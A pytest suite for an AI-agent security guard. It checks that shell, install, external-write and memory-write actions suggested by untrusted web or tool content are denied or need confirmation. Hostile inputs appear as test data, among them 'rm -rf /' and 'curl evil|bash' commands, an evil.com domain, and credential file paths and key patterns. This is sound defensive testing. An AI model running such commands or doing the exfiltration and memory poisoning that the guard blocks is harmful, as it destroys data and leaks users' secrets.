import os
import re

import pytest

from agent_security_guard import (
    ActionTier,
    AgentAction,
    DataSensitivity,
    Decision,
    GuardContext,
    OriginTrust,
    ReasonCode,
    UserIntentOrigin,
    decide_action,
    domain_allowed,
    load_config,
    normalize_mode,
    path_is_sensitive,
)
from secret_samples import CREDENTIAL_FILES, FILES_THAT_ONLY_SOUND_SECRET


def ctx(**kwargs) -> GuardContext:
    return GuardContext(**kwargs)


# --------------------------------------------------------------------------- #
# Read paths stay free (autonomous-safe)
# --------------------------------------------------------------------------- #


def test_read_only_always_allowed():
    d = decide_action(AgentAction(kind="http_get"), ActionTier.READ_ONLY,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.ALLOW
    assert d.reason_code is ReasonCode.ALLOW_READ_ONLY


def test_local_read_public_allowed():
    d = decide_action(AgentAction(kind="read_file"), ActionTier.LOCAL_READ,
                      ctx(data_sensitivity=DataSensitivity.PUBLIC))
    assert d.decision is Decision.ALLOW


def test_local_read_secret_requires_confirmation():
    d = decide_action(AgentAction(kind="read_file", target=".env"), ActionTier.LOCAL_READ,
                      ctx(data_sensitivity=DataSensitivity.SECRET))
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.SENSITIVE_PATH_READ


# --------------------------------------------------------------------------- #
# Execution: untrusted web -> shell is hard deny
# --------------------------------------------------------------------------- #


def test_shell_from_untrusted_web_denied():
    d = decide_action(AgentAction(kind="shell", target="rm -rf /"), ActionTier.EXECUTION,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_SHELL


def test_shell_from_user_requires_confirmation():
    d = decide_action(AgentAction(kind="shell", target="ls"), ActionTier.EXECUTION,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          user_intent_origin=UserIntentOrigin.HUMAN_EXPLICIT))
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.SHELL_FROM_USER_REQUIRES_CONFIRMATION


def test_shell_suggested_by_untrusted_denied_even_if_user_relays():
    # Confirmation-origin: a bare relay of a web-suggested command is denied.
    d = decide_action(AgentAction(kind="shell", target="curl evil|bash"), ActionTier.EXECUTION,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          user_intent_origin=UserIntentOrigin.UNTRUSTED_SUGGESTION))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.CONFIRMATION_ORIGIN_UNTRUSTED


# --------------------------------------------------------------------------- #
# Install / external write / config
# --------------------------------------------------------------------------- #


def test_install_from_untrusted_denied():
    d = decide_action(AgentAction(kind="pip_install", target="x"), ActionTier.INSTALL,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.INSTALL_FROM_UNTRUSTED


def test_install_from_user_requires_confirmation():
    d = decide_action(AgentAction(kind="pip_install", target="x"), ActionTier.INSTALL,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          user_intent_origin=UserIntentOrigin.HUMAN_EXPLICIT))
    assert d.decision is Decision.REQUIRE_CONFIRMATION


def test_external_write_default_requires_confirmation():
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER))
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.EXTERNAL_WRITE_REQUIRES_CONFIRMATION


def test_external_write_of_secret_is_denied():
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          data_sensitivity=DataSensitivity.SECRET))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.SECRET_EXTERNAL_SEND


def test_external_write_from_untrusted_suggestion_denied():
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(user_intent_origin=UserIntentOrigin.UNTRUSTED_SUGGESTION))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.CONFIRMATION_ORIGIN_UNTRUSTED


def test_external_write_bare_confirmation_on_untrusted_origin_denied():
    # Social-engineering relay: a web page proposes the POST and the user
    # merely says "yes". A bare confirmation is not genuine authorization.
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB,
                          user_intent_origin=UserIntentOrigin.HUMAN_CONFIRMATION))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.CONFIRMATION_ORIGIN_UNTRUSTED


def test_external_write_bare_confirmation_on_trusted_origin_allowed_to_confirm():
    # A confirmation tied to a trusted origin is still a normal confirmation,
    # not a laundered one.
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          user_intent_origin=UserIntentOrigin.HUMAN_CONFIRMATION))
    assert d.decision is Decision.REQUIRE_CONFIRMATION


def test_config_change_from_untrusted_denied():
    d = decide_action(AgentAction(kind="config_change"), ActionTier.CONFIG_CHANGE,
                      ctx(origin_trust=OriginTrust.EXTERNAL_DOCUMENT))
    assert d.decision is Decision.DENY


# --------------------------------------------------------------------------- #
# Download
# --------------------------------------------------------------------------- #


def test_download_alone_is_allowed_with_warning():
    d = decide_action(AgentAction(kind="download", target="https://x/a.sh"), ActionTier.DOWNLOAD,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.ALLOW_WITH_WARNING
    assert d.reason_code is ReasonCode.ALLOW_DOWNLOAD_INSPECT


# --------------------------------------------------------------------------- #
# Memory bridge (action-tier path)
# --------------------------------------------------------------------------- #


def test_memory_external_to_authorization_denied():
    a = AgentAction(kind="memory_write", desired_memory_lane="authorization",
                    memory_source="external")
    d = decide_action(a, ActionTier.MEMORY_WRITE,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_AUTH_MEMORY


def test_memory_external_to_procedural_denied():
    a = AgentAction(kind="memory_write", desired_memory_lane="procedural",
                    memory_source="tool")
    d = decide_action(a, ActionTier.MEMORY_WRITE, ctx(origin_trust=OriginTrust.TOOL_OUTPUT))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_PROCEDURAL_MEMORY


def test_memory_external_to_evidence_allowed_with_warning():
    a = AgentAction(kind="memory_write", desired_memory_lane="evidence",
                    memory_source="external")
    d = decide_action(a, ActionTier.MEMORY_WRITE, ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.ALLOW_WITH_WARNING
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_EVIDENCE_MEMORY


def test_memory_external_to_identity_requires_confirmation():
    a = AgentAction(kind="memory_write", desired_memory_lane="identity",
                    memory_source="external")
    d = decide_action(a, ActionTier.MEMORY_WRITE, ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_IDENTITY_MEMORY


def test_memory_observation_to_authorization_allowed():
    a = AgentAction(kind="memory_write", desired_memory_lane="authorization",
                    memory_source="observation")
    d = decide_action(a, ActionTier.MEMORY_WRITE, ctx(origin_trust=OriginTrust.TRUSTED_USER))
    assert d.decision is Decision.ALLOW


def _memory(lane, source=None, **context):
    action = AgentAction(kind="memory_write", desired_memory_lane=lane, memory_source=source)
    return decide_action(action, ActionTier.MEMORY_WRITE, ctx(**context))


@pytest.mark.parametrize("lane", ["authorization", "procedural"])
@pytest.mark.parametrize("origin", [OriginTrust.TRUSTED_USER, OriginTrust.UNSPECIFIED])
def test_privileged_memory_without_a_source_is_asked_about(lane, origin):
    d = _memory(lane, origin_trust=origin)
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.PRIVILEGED_MEMORY_REQUIRES_CONFIRMATION
    assert d.audit_required is True


def test_privileged_memory_from_observation_is_audited():
    d = _memory("authorization", "observation", origin_trust=OriginTrust.TRUSTED_USER)
    assert d.decision is Decision.ALLOW
    assert d.audit_required is True


@pytest.mark.parametrize("setting,expected", [
    ("deny", Decision.DENY),
    ("allow_with_warning", Decision.ALLOW_WITH_WARNING),
    ("allow", Decision.ALLOW),
])
def test_operator_can_tune_the_unsourced_privileged_write(setting, expected):
    config = load_config(None)
    config.tiers["memory_unsourced_to_privileged"] = setting
    d = _memory("procedural", origin_trust=OriginTrust.TRUSTED_USER, config=config)
    assert d.decision is expected
    assert d.audit_required is True


@pytest.mark.parametrize("lane", [
    "auth", "Auth", "authz", "authorisation", "permissions", "grants",
    "authorization-lane", "auth_memory", '["authorization"]', "\u200bauthorization\u200b",
])
def test_other_names_for_the_authorization_lane_are_denied(lane):
    d = _memory(lane, "external", origin_trust=OriginTrust.EXTERNAL_WEB)
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_AUTH_MEMORY


@pytest.mark.parametrize("lane", [
    "rules", "rule", "system", "policy", "instructions", " PROCEDURAL ",
    "procedural lane", "system-prompt",
])
def test_other_names_for_the_procedural_lane_are_denied(lane):
    d = _memory(lane, "tool", origin_trust=OriginTrust.TOOL_OUTPUT)
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_PROCEDURAL_MEMORY


@pytest.mark.parametrize("lane", ["core", "admin", "trusted", "auth0rization", "", None])
@pytest.mark.parametrize("context", [
    dict(origin_trust=OriginTrust.EXTERNAL_WEB),
    dict(origin_trust=OriginTrust.TRUSTED_USER,
         user_intent_origin=UserIntentOrigin.UNTRUSTED_SUGGESTION),
])
def test_a_lane_the_guard_cannot_read_is_not_taken_for_evidence(lane, context):
    d = _memory(lane, **context)
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_UNKNOWN_MEMORY_LANE


@pytest.mark.parametrize("lane", ["notes", None])
def test_unreadable_lane_on_a_trusted_origin_is_allowed_and_audited(lane):
    d = _memory(lane, origin_trust=OriginTrust.TRUSTED_USER)
    assert d.decision is Decision.ALLOW_WITH_WARNING
    assert d.reason_code is ReasonCode.UNKNOWN_MEMORY_LANE_AUDITED
    assert d.audit_required is True


@pytest.mark.parametrize("lane", ["notes", None])
def test_strict_mode_asks_about_a_lane_it_cannot_read(lane):
    d = _memory(lane, origin_trust=OriginTrust.TRUSTED_USER, mode="strict")
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.MEMORY_WRITE_REQUIRES_CONFIRMATION


def test_strict_mode_leaves_a_named_lane_alone():
    d = _memory("evidence", origin_trust=OriginTrust.TRUSTED_USER, mode="strict")
    assert d.decision is Decision.ALLOW


def test_operator_can_tune_the_unknown_lane_denial():
    config = load_config(None)
    config.tiers["memory_external_to_unknown_lane"] = "require_confirmation"
    d = _memory("core", "external", origin_trust=OriginTrust.EXTERNAL_WEB, config=config)
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_UNKNOWN_MEMORY_LANE


def test_untrusted_source_alone_does_not_get_an_unnamed_lane():
    d = _memory(None, "external", origin_trust=OriginTrust.TRUSTED_USER)
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_UNKNOWN_MEMORY_LANE


def test_untrusted_preference_is_asked_about():
    d = _memory("preference", "external", origin_trust=OriginTrust.EXTERNAL_WEB)
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_PREFERENCE_MEMORY


def test_conversation_cannot_write_a_privileged_lane():
    d = _memory("authorization", "conversation", origin_trust=OriginTrust.TRUSTED_USER)
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_AUTH_MEMORY


def test_operator_declares_the_hosts_own_lane_names(tmp_path):
    path = tmp_path / "guard.yaml"
    path.write_text(
        "memory_lanes:\n  Notes: evidence\n  perms: authorization\n", encoding="utf-8"
    )
    config = load_config(str(path))
    assert config.memory_lanes == {"notes": "evidence", "perms": "authorization"}
    web = dict(origin_trust=OriginTrust.EXTERNAL_WEB, config=config)
    assert _memory("notes", "external", **web).reason_code is ReasonCode.UNTRUSTED_TO_EVIDENCE_MEMORY
    assert _memory("perms", "external", **web).reason_code is ReasonCode.UNTRUSTED_TO_AUTH_MEMORY


@pytest.mark.parametrize("line", ["notes: evidense", "authorization: evidence"])
def test_memory_lanes_typo_or_redefinition_raises(tmp_path, line):
    path = tmp_path / "guard.yaml"
    path.write_text(f"memory_lanes:\n  {line}\n", encoding="utf-8")
    with pytest.raises(ValueError):
        load_config(str(path))


# --------------------------------------------------------------------------- #
# Unknown tier fails safe
# --------------------------------------------------------------------------- #


def test_unknown_tier_is_audited_not_blocked_by_default():
    # An unrecognized tool kind is not evidence of danger. Blocking it here made
    # the guard deny the host's own tools (list_dir, dashboard_query, ...).
    d = decide_action(AgentAction(kind="teleport"), ActionTier.UNKNOWN, ctx())
    assert d.decision is Decision.ALLOW_WITH_WARNING
    assert d.reason_code is ReasonCode.UNKNOWN_ACTION_AUDITED
    assert d.audit_required is True


def test_unknown_tier_requires_confirmation_in_strict_mode():
    d = decide_action(
        AgentAction(kind="teleport"), ActionTier.UNKNOWN, ctx(mode="strict")
    )
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.UNKNOWN_ACTION_REQUIRES_CONFIRMATION


# --------------------------------------------------------------------------- #
# Predicates
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("path", [
    "/home/u/proj/.env",
    "secrets.json",
    "/a/b/id_rsa",
    "/x/.ssh/known_hosts",
    "deploy.pem",
    "credentials.yaml",
    "/home/u/.aws/config",
])
def test_path_is_sensitive_true(path):
    cfg = load_config()
    assert path_is_sensitive(path, cfg.sensitive_paths) is True


@pytest.mark.parametrize("path", [
    "app.log",
    "logs/today.log",
    "memory.db",
    "agent-memory.sqlite",
    "settings.json",
    "config.py",
    "docker-compose.yml",
])
def test_ordinary_developer_files_are_not_sensitive(path):
    # These globs used to be shipped as "sensitive", which marked normal project
    # files secret-bearing and then denied every later external write.
    cfg = load_config()
    assert path_is_sensitive(path, cfg.sensitive_paths) is False


@pytest.mark.parametrize("path", CREDENTIAL_FILES)
def test_credential_files_are_sensitive(path):
    cfg = load_config()
    assert path_is_sensitive(path, cfg.sensitive_paths) is True


@pytest.mark.parametrize("path", FILES_THAT_ONLY_SOUND_SECRET)
def test_files_that_only_sound_like_credentials_are_not_sensitive(path):
    cfg = load_config()
    assert path_is_sensitive(path, cfg.sensitive_paths) is False


@pytest.mark.parametrize("path", [
    "/home/u/proj/main.py",
    "README.md",
    "src/app/index.tsx",
])
def test_path_is_sensitive_false(path):
    cfg = load_config()
    assert path_is_sensitive(path, cfg.sensitive_paths) is False


def test_domain_allowed():
    allow = ["pypi.org", "github.com"]
    assert domain_allowed("https://pypi.org/simple", allow) is True
    assert domain_allowed("https://files.pypi.org/x", allow) is True
    assert domain_allowed("https://evil.com/x", allow) is False


# --------------------------------------------------------------------------- #
# Config loading
# --------------------------------------------------------------------------- #


def test_load_defaults_without_file():
    cfg = load_config()
    assert cfg.mode == "autonomous-safe"
    assert cfg.tiers["read_only"] == "allow"
    assert cfg.tiers["shell_from_untrusted"] == "deny"


def test_load_real_guard_yaml():
    repo_root = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "..", "..")
    )
    guard_path = os.path.join(repo_root, "guard.yaml")
    cfg = load_config(guard_path)
    assert cfg.mode == "autonomous-safe"
    assert ".env" in cfg.sensitive_paths
    assert cfg.audit["backend"] == "sqlite"
    assert cfg.limits["max_content_chars"] == 20000


def test_shipped_guard_yaml_lists_what_the_defaults_list():
    # A list in guard.yaml replaces the built-in one, so a shipped file that
    # falls behind would take detectors away from everyone who installs it.
    repo_root = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "..", "..")
    )
    shipped = load_config(os.path.join(repo_root, "guard.yaml"))
    defaults = load_config(None)
    assert shipped.secret_patterns == defaults.secret_patterns
    assert shipped.sensitive_paths == defaults.sensitive_paths
    assert shipped.untrusted_content_tools == defaults.untrusted_content_tools
    assert shipped.self_modification_paths == defaults.self_modification_paths


def _policy(tmp_path, text):
    path = tmp_path / "guard.yaml"
    path.write_text(text, encoding="utf-8")
    return str(path)


# What the loader used to replace with something else, without a word.


def test_list_written_on_one_line_is_not_taken_apart_into_characters(tmp_path):
    cfg = load_config(_policy(tmp_path, 'sensitive_paths: [".env", "*.pem", "prod-secrets/"]\n'))
    assert cfg.sensitive_paths == [".env", "*.pem", "prod-secrets/"]
    assert path_is_sensitive("/proj/.env", cfg.sensitive_paths) is True


@pytest.mark.parametrize("key", [
    "sensitive_paths", "secret_patterns", "domain_allowlist",
    "self_modification_paths", "untrusted_content_tools",
])
@pytest.mark.parametrize("value", ['".env"', "", "true", "3", "{a: b}"])
def test_text_where_a_list_belongs_raises(tmp_path, key, value):
    with pytest.raises(ValueError, match=key):
        load_config(_policy(tmp_path, f"{key}: {value}\n"))


@pytest.mark.parametrize("text,names", [
    ("mode: stict\n", "stict"),
    ("mode: 3\n", "mode"),
    ("mode:\n", "mode"),
    ("on_error: deny-all\n", "deny-all"),
    ("audit:\n  backend: sqllite\n", "sqllite"),
    ("audit:\n  backend: csv\n", "csv"),
    ("audit:\n  pth: x.db\n", "pth"),
    ('secret_patterns:\n  - "AKIA[0-9A-Z]{16}"\n  - "(unclosed"\n', "unclosed"),
    ("secret_patterns: ['[a-']\n", "secret_patterns"),
    ("sensitve_paths:\n  - .env\n", "sensitve_paths"),
    ("tiers:\n  shel_from_user: deny\n", "shel_from_user"),
    ("tiers:\n  external_write: denny\n", "denny"),
    ("tiers:\n  external_write: true\n", "external_write"),
    ("tiers: deny\n", "tiers"),
    ("scope_from_text: maybe\n", "scope_from_text"),
    ("wrap_tool_results: 0\n", "wrap_tool_results"),
    ("limits:\n  chain_window: twelve\n", "chain_window"),
    ("limits:\n  chain_window: 0\n", "chain_window"),
    ("limits:\n  chain_windw: 12\n", "chain_windw"),
    ("limits:\n  max_content_chars: -1\n", "max_content_chars"),
    ("sensitive_paths:\n  - [a, b]\n", "sensitive_paths"),
    ("mode: strict\nmode: monitor\n", "mode"),
])
def test_entry_that_cannot_be_applied_as_written_raises(tmp_path, text, names):
    with pytest.raises(ValueError, match=re.escape(names)):
        load_config(_policy(tmp_path, text))


def test_every_problem_is_named_at_once(tmp_path):
    text = "mode: stict\ntiers:\n  shel_from_user: deny\naudit:\n  backend: csv\n"
    with pytest.raises(ValueError) as raised:
        load_config(_policy(tmp_path, text))
    message = str(raised.value)
    assert "3 entries" in message
    for part in ("stict", "shel_from_user", "did you mean 'shell_from_user'", "csv"):
        assert part in message


def test_valid_file_in_every_spelling_the_loader_accepts(tmp_path):
    cfg = load_config(_policy(tmp_path, """---
mode: Strict
on_error: deny_all
scope_from_text: yes
wrap_tool_results: off
domain_allowlist: [example.com, "api.github.com"]
sensitive_paths:
  - .env
  - 8080
tiers:
  external_write: Deny
  shell_from_user: allow_with_warning
limits:
  chain_window: 20
audit:
  backend: none
tool_tiers: {memory: unknown}
memory_lanes:
  notes: evidence
"""))
    assert normalize_mode(cfg.mode) == "strict"
    assert cfg.on_error == "deny_all"
    assert cfg.scope_from_text is True
    assert cfg.wrap_tool_results is False
    assert cfg.domain_allowlist == ["example.com", "api.github.com"]
    assert cfg.sensitive_paths == [".env", "8080"]
    assert cfg.tiers["external_write"] == "deny"
    assert cfg.tiers["read_only"] == "allow"            # untouched default
    assert cfg.limits["chain_window"] == 20
    assert cfg.limits["max_content_chars"] == 20000     # untouched default
    assert cfg.audit["backend"] == "none"
    assert cfg.tool_tiers == {"memory": "unknown"}
    assert cfg.memory_lanes == {"notes": "evidence"}


@pytest.mark.parametrize("word,expected", [
    ("true", True), ("yes", True), ("on", True), ("True", True),
    ("false", False), ("no", False), ("off", False), ("No", False),
])
def test_no_means_no(tmp_path, word, expected):
    # bool("no") is True: the switch used to be on for every word but nothing.
    cfg = load_config(_policy(tmp_path, f"scope_from_text: {word}\n"))
    assert cfg.scope_from_text is expected


@pytest.mark.parametrize("mode", ["monitor", "autonomous-safe", "strict", "off", "safe", "enforce"])
def test_every_mode_name_and_alias_loads(tmp_path, mode):
    assert load_config(_policy(tmp_path, f"mode: {mode}\n")).mode == mode


def test_malformed_config_raises(tmp_path):
    bad = tmp_path / "guard.yaml"
    bad.write_text("tiers:\n\tread_only: allow\n", encoding="utf-8")
    with pytest.raises(ValueError):
        load_config(str(bad))


def test_tool_tiers_are_loaded_by_lower_case_name(tmp_path):
    path = tmp_path / "guard.yaml"
    path.write_text("tool_tiers:\n  Deploy: execution\n  codebase_search: read_only\n", encoding="utf-8")
    cfg = load_config(str(path))
    assert cfg.tool_tiers == {"deploy": "execution", "codebase_search": "read_only"}


def test_misspelled_tool_tier_raises(tmp_path):
    # A typo must not quietly leave the tool unclassified.
    path = tmp_path / "guard.yaml"
    path.write_text("tool_tiers:\n  deploy: exection\n", encoding="utf-8")
    with pytest.raises(ValueError, match="deploy"):
        load_config(str(path))


def test_shipped_defaults_protect_skill_and_policy_files():
    cfg = load_config(None)
    assert cfg.tool_tiers == {}
    assert cfg.self_modification_paths == ["SKILL.md", "guard.yaml"]
